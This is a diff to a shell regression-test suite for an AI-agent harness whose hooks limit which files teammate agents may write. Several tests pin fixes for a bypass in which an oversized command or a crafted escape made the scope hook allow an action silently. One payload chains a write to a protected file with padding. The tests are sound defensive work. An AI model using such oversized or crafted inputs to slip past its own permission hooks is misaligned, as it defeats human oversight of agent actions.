@@ -9969,10 +9672,9 @@ echo "== F089 round 2: adversarial-review bugfixes (ARG_MAX, agent_id, allow-log
 # starts failing with "argument list too long" once BIG exceeds roughly
 # 1,000,000 bytes here), for margin against JSON/env overhead.
 
-DIR_AM_ES="$WORK/f089r2-argmax-enforce-scope"
-make_fixture "$DIR_AM_ES"
-install_hooks "$DIR_AM_ES"
-printf 'src/parser/\n' > "$DIR_AM_ES/.claude/teammate-scope.txt"
+DIR_AM_ES_MAIN="$WORK/f089r2-argmax-enforce-scope"
+make_worktree_fixture "$DIR_AM_ES_MAIN"
+DIR_AM_ES="$DIR_AM_ES_MAIN-wt"
 AM_ES_PAYLOAD=$(python3 -c "
 import json
 print(json.dumps({
@@ -10013,18 +9715,18 @@ assert_deny_json "$OUT" \
 # attributes every teammate's gate verdict to the lead node instead of the
 # real teammate.
 
-DIR_AID_ES="$WORK/f089r2-agentid-enforce-scope"
-make_fixture "$DIR_AID_ES"
-install_hooks "$DIR_AID_ES"
-printf 'src/parser/\n' > "$DIR_AID_ES/.claude/teammate-scope.txt"
+DIR_AID_ES_MAIN="$WORK/f089r2-agentid-enforce-scope"
+make_worktree_fixture "$DIR_AID_ES_MAIN"
+DIR_AID_ES="$DIR_AID_ES_MAIN-wt"
 AID_ES_LOG="$DIR_AID_ES/.harness/dashboard/aidsess.jsonl"
 
-# _dashboard_log() call site (legacy exit-2 out-of-scope-edit path).
+# _dashboard_log() call site (the allow path, which routes through the same
+# helper the legacy exit-2 path uses).
 AID_ES_PAYLOAD1=$(python3 -c "
 import json
 print(json.dumps({'hook_event_name': 'PreToolUse', 'session_id': 'aidsess',
                    'agent_id': 'agent-7', 'agent_type': 'teammate',
-                   'tool_input': {'file_path': 'src/other/y.py'}}))
+                   'tool_input': {'file_path': 'src/parser/y.py'}}))
 ")
 OUT=$(run_hook_dashboard "$DIR_AID_ES" enforce-scope.sh "$AID_ES_PAYLOAD1" 2>&1)
 LINE=$(cat "$AID_ES_LOG" 2>/dev/null)
@@ -10083,23 +9785,21 @@ assert_contains "$LINE" '"agent_type": "teammate"' \
   "f089r2-vq: _dashboard_log() propagates agent_type from the payload"
 
 # --- Finding 8 (MINOR): enforce-scope.sh never logged an "allow" verdict for
-# the ordinary in-scope Bash-command path -- only the Edit/Write scope-match
-# branch, and the deny_json()/legacy-exit-2 paths, were instrumented; the
-# file's own final `exit 0` (reached by an in-scope or write-free Bash
-# command) was silent.
+# the ordinary Bash-command path -- only the Edit/Write branch, and the
+# deny_json()/legacy-exit-2 paths, were instrumented; the file's own final
+# `exit 0` (reached by an ordinary or write-free Bash command) was silent.
 
-DIR_ALLOW_BASH="$WORK/f089r2-allow-bash"
-make_fixture "$DIR_ALLOW_BASH"
-install_hooks "$DIR_ALLOW_BASH"
-printf 'src/parser/\n' > "$DIR_ALLOW_BASH/.claude/teammate-scope.txt"
+DIR_ALLOW_BASH_MAIN="$WORK/f089r2-allow-bash"
+make_worktree_fixture "$DIR_ALLOW_BASH_MAIN"
+DIR_ALLOW_BASH="$DIR_ALLOW_BASH_MAIN-wt"
 AB_LOG="$DIR_ALLOW_BASH/.harness/dashboard/absess.jsonl"
 OUT=$(run_hook_dashboard "$DIR_ALLOW_BASH" enforce-scope.sh \
   "$(f089_bash_json 'echo hi' 'absess')")
 RC=$?
-assert_rc0 "$RC" "f089r2-es: an ordinary in-scope Bash command still exits 0"
+assert_rc0 "$RC" "f089r2-es: an ordinary Bash command still exits 0"
 LINE=$(cat "$AB_LOG" 2>/dev/null)
 assert_contains "$LINE" '"verdict": "allow"' \
-  "f089r2-es: an ordinary in-scope Bash command now logs verdict=allow before the final exit 0"
+  "f089r2-es: an ordinary Bash command now logs verdict=allow before the final exit 0"
 
 echo ""
 echo "== agent frontmatter =="
@@ -10719,19 +10419,20 @@ echo "== F069: correct the falsified TeammateIdle identity claim =="
 
 # F055's original claim (TeammateIdle carries no teammate identity at all) was
 # found false during F067's round-1 review; F069 corrected agents/reviewer.md
-# and README.md. OVI-144 Phase 3 then removed reviewer.md's TeammateIdle
-# passage entirely (absence pinned by the hs2 agent sweep), leaving README.md
-# as the corrected site checked here.
+# and README.md. OVI-144 Phase 3 then retired the TeammateIdle hook and removed
+# every shipped discussion of its payload, which supersedes the correction: the
+# guard here is that the falsified claim never reappears and README no longer
+# discusses the retired payload at all.
 
 if grep -q "the hook payload carries" "$REPO_ROOT/README.md" && grep -q "no teammate identity" "$REPO_ROOT/README.md"; then
   fail "f069: README.md still asserts the falsified 'no teammate identity' claim"
 else
   pass "f069: README.md no longer asserts the falsified claim"
 fi
-if grep -q "use the payload's \`teammate_name\` to decide whether to fire" "$REPO_ROOT/README.md"; then
-  pass "f069: README.md states the corrected fact"
+if grep -q "TeammateIdle" "$REPO_ROOT/README.md"; then
+  fail "f069: README.md still discusses the retired TeammateIdle payload"
 else
-  fail "f069: README.md missing the corrected TeammateIdle fact"
+  pass "f069: README.md no longer discusses the retired TeammateIdle hook at all"
 fi
 
 # The considered-and-declined design section was Teams-mechanism-specific and
@@ -12892,7 +12593,7 @@ assert_contains "$OUT" "orientation truncated:" \
   "f097: the safety net marker fires on the realistic-root overflow"
 assert_contains "$OUT" "rules/tdd.md" \
   "f097: the rule-pointer footer survives truncation (last pointer present)"
-assert_contains "$OUT" "rules/agent-teams-protocol.md" \
+assert_contains "$OUT" "rules/parallel-work.md" \
   "f097: the rule-pointer footer survives truncation (first pointer present)"
 assert_contains "$OUT" "Run /harness-continue" \
   "f097: the /harness-continue line survives truncation"
@@ -12912,14 +12613,15 @@ assert_contains "$OUT" "## Harness orientation" \
 echo ""
 echo "== F098: single features.json load for the remaining session-start checks =="
 
-# Arrange all three checks (spec drift, scope-unarmed, test_file-existence) to
-# fire at once: the base fixture already ships F001/F002 with test_file paths
-# that don't exist on disk (F066's real-world shape), so only spec drift and
-# scope-unarmed need explicit setup.
+# Arrange both remaining checks (spec drift, test_file-existence) to fire at
+# once: the base fixture already ships F001/F002 with test_file paths that
+# don't exist on disk (F066's real-world shape), so only spec drift needs
+# explicit setup. The scope-unarmed check this consolidation originally
+# covered as its third caller retired with OVI-144 Phase 3 -- the
+# consolidation guarantee itself (one features.json load for every check
+# session-start.sh still runs) is what these assertions pin.
 DIR_F098="$WORK/f098-single-load"
 make_fixture "$DIR_F098"
-mkdir -p "$DIR_F098/.claude/hooks"
-printf '#!/bin/bash\nexit 0\n' > "$DIR_F098/.claude/hooks/enforce-scope.sh"
 python3 - "$DIR_F098/.harness/features.json" <<'PYEOF'
 import json
 import sys
@@ -12928,8 +12630,6 @@ path = sys.argv[1]
 with open(path) as fh:
     data = json.load(fh)
 for feature in data["features"]:
-    if feature["id"] == "F002":
-        feature["assigned_to"] = "api"
     if feature["id"] == "F003":
         feature["spec"] = {"hash": "0" * 60 + "dead", "verdict": "PASS", "sv_version": "1.0"}
 with open(path, "w") as fh:
@@ -12960,25 +12660,25 @@ OUT=$(cd "$DIR_F098" && printf '%s' '{"source":"startup"}' \
   | PATH="$F098_FAKE_DIR:$PATH" CLAUDE_PROJECT_DIR="$DIR_F098" env -u CLAUDE_PLUGIN_ROOT \
     bash "$HOOKS_DIR/session-start.sh")
 RC=$?
-assert_rc0 "$RC" "f098: the triple-warning fixture still exits 0"
+assert_rc0 "$RC" "f098: the double-warning fixture still exits 0"
 assert_contains "$OUT" "WARNING: spec drift" "f098: spec-drift warning still fires"
-assert_contains "$OUT" "WARNING: scope enforcement unarmed" "f098: scope-unarmed warning still fires"
 assert_contains "$OUT" "WARNING: test_file does not exist for" "f098: test_file-existence warning still fires"
+assert_not_contains "$OUT" "scope enforcement" \
+  "f098: no scope-enforcement warning survives the OVI-144 Phase 3 retirement"
 
 SPEC_DRIFT_CALLS=$(grep -l 'import hashlib' "$F098_LOG_DIR"/*.log 2>/dev/null | wc -l | tr -d ' ')
-SCOPE_CALLS=$(grep -l 'armed_needed' "$F098_LOG_DIR"/*.log 2>/dev/null | wc -l | tr -d ' ')
 TESTFILE_CALLS=$(grep -l 'os.path.isfile(os.path.join(root, test_file))' "$F098_LOG_DIR"/*.log 2>/dev/null | wc -l | tr -d ' ')
-if [ "$SPEC_DRIFT_CALLS" = "1" ] && [ "$SCOPE_CALLS" = "1" ] && [ "$TESTFILE_CALLS" = "1" ]; then
-  pass "f098: each of the three checks appears in exactly one logged python3 invocation"
+if [ "$SPEC_DRIFT_CALLS" = "1" ] && [ "$TESTFILE_CALLS" = "1" ]; then
+  pass "f098: each remaining check appears in exactly one logged python3 invocation"
 else
-  fail "f098: expected each check in exactly 1 invocation, got spec-drift=$SPEC_DRIFT_CALLS scope=$SCOPE_CALLS test_file=$TESTFILE_CALLS"
+  fail "f098: expected each check in exactly 1 invocation, got spec-drift=$SPEC_DRIFT_CALLS test_file=$TESTFILE_CALLS"
 fi
 
 SAME_CALL=$(grep -l 'import hashlib' "$F098_LOG_DIR"/*.log 2>/dev/null)
-if [ -n "$SAME_CALL" ] && grep -q 'armed_needed' "$SAME_CALL" && grep -q 'os.path.isfile(os.path.join(root, test_file))' "$SAME_CALL"; then
-  pass "f098: all three checks run inside the SAME python3 invocation (one features.json load)"
+if [ -n "$SAME_CALL" ] && grep -q 'os.path.isfile(os.path.join(root, test_file))' "$SAME_CALL"; then
+  pass "f098: both checks run inside the SAME python3 invocation (one features.json load)"
 else
-  fail "f098: the three checks are not all in the same python3 invocation -- consolidation regressed"
+  fail "f098: the two checks are not in the same python3 invocation -- consolidation regressed"
 fi
 
 echo "== F096: \$COMMAND/DENY_REASON ARG_MAX bypass (one call site earlier than F088-F093) =="
@@ -12993,13 +12693,12 @@ echo "== F096: \$COMMAND/DENY_REASON ARG_MAX bypass (one call site earlier than 
 # pre-fix hooks before this fix (rc=0, empty stdout, same as the F089 round
 # 2 incident these tests mirror).
 
-DIR_F096_ES="$WORK/f096-argmax-enforce-scope"
-make_fixture "$DIR_F096_ES"
-install_hooks "$DIR_F096_ES"
-printf 'src/parser/\n' > "$DIR_F096_ES/.claude/teammate-scope.txt"
+DIR_F096_ES_MAIN="$WORK/f096-argmax-enforce-scope"
+make_worktree_fixture "$DIR_F096_ES_MAIN"
+DIR_F096_ES="$DIR_F096_ES_MAIN-wt"
 F096_ES_PAYLOAD=$(python3 -c "
 import json
-cmd = 'echo x > src/other/' + ('A' * 2000000) + '.txt'
+cmd = 'echo x > .harness/features.json ; echo ' + ('A' * 2000000)
 print(json.dumps({
     'hook_event_name': 'PreToolUse',
     'session_id': 'f096sess',
@@ -13008,13 +12707,30 @@ print(json.dumps({
 ")
 OUT=$(run_hook_dashboard "$DIR_F096_ES" enforce-scope.sh "$F096_ES_PAYLOAD")
 RC=$?
-assert_rc0 "$RC" "f096-es: an oversized out-of-scope Bash command still exits 0"
+assert_rc0 "$RC" "f096-es: an oversized lead-owned Bash command still exits 0"
 assert_deny_json "$OUT" \
-  "f096-es: an oversized out-of-scope Bash command still emits deny JSON (not a silent allow)"
-# The write target enforce-scope.sh quotes into its own reason string is the
-# same oversized text, so DENY_REASON itself is oversized here too -- it
-# must be capped before reaching deny_json()'s own argv-carried "reason",
-# or that exec fails the identical way, one call site later still.
+  "f096-es: an oversized lead-owned Bash command still emits deny JSON (not a silent allow)"
+
+# DENY_REASON is only attacker-sized on the analysis-failure path, which
+# quotes the offending segment verbatim (the lead-owned reason is a fixed
+# sentence) -- so the cap is exercised through the F042 fault-injected fixture,
+# whose "\Q" escape raises inside the decoder, with an oversized segment. Without
+# the cap, that reason reaches deny_json()'s own argv-carried "reason" and fails
+# the identical exec, one call site later still.
+F096_ES_CRASH_PAYLOAD=$(python3 -c "
+import json
+cmd = 'echo x > \$\'\\\\Qtrigger\' ' + ('A' * 2000000)
+print(json.dumps({
+    'hook_event_name': 'PreToolUse',
+    'session_id': 'f096sess',
+    'tool_input': {'command': cmd},
+}))
+")
+OUT=$(run_hook "$DIR_HS_F042" enforce-scope.sh "$F096_ES_CRASH_PAYLOAD")
+RC=$?
+assert_rc0 "$RC" "f096-es: an oversized analysis-failure command still exits 0"
+assert_deny_json "$OUT" \
+  "f096-es: an oversized analysis-failure command still emits deny JSON (not a silent allow)"
 REASON_LEN=$(python3 -c "
 import json, sys
 data = json.loads(sys.argv[1])
